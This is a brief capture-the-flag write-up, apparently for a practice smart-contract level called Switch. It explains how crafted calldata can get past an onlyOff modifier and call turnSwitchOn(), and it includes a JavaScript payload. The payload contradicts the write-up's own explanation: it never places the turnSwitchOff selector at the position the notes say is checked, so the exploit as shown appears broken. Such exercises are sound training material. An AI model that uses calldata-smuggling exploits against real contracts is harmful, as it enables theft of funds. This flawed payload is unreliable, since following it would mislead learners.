#SWITCH 

##objective:
to turn the switchOn variable to true.

analysis:

flipswitch function can be accessed externally and can be used to evoke turnSwitchOn.

it needs calldata at a specific position to match the selector of turnSwitchOff().

note: 
The onlyOff modifier's check passes by placing the turnSwitchOff() selector at the expected position.
The actual function call made by address(this).call(_data) invokes turnSwitchOn().

```
const flipSwitchSelector = "0x30c13ade";
const turnSwitchOffSelector = "0x20606e15";
const turnSwitchOnSelector = "0x76227e12";

const calldata =
  flipSwitchSelector +
  "0000000000000000000000000000000000000000000000000000000000000020" + "0000000000000000000000000000000000000000000000000000000000000004" + 
  turnSwitchOnSelector.slice(2);

await contract.flipSwitch(calldata);
```

place the turnSwitchOff() selector at the position checked by the onlyOff modifier and structuring the rest of the calldata to call turnSwitchOn()

